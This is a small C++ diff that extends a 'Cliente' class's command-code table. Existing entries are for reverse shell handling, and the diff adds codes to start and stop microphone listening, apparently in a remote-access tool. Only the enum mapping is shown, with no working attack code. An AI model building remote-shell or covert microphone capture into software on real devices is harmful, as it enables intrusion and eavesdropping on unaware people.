@@ -29,7 +29,9 @@ class Cliente {
 			{"503", EnumComandos::Reverse_Shell_Salida},
 			{"504", EnumComandos::Reverse_Shell_Finish},
 			{"505", EnumComandos::Mic_Refre_Dispositivos},
-			{"506", EnumComandos::Mic_Refre_Resultado}
+			{"506", EnumComandos::Mic_Refre_Resultado},
+			{"507", EnumComandos::Mic_Iniciar_Escucha},
+			{"508", EnumComandos::Mic_Detener_Escucha}
 		};
 
 		Cliente();
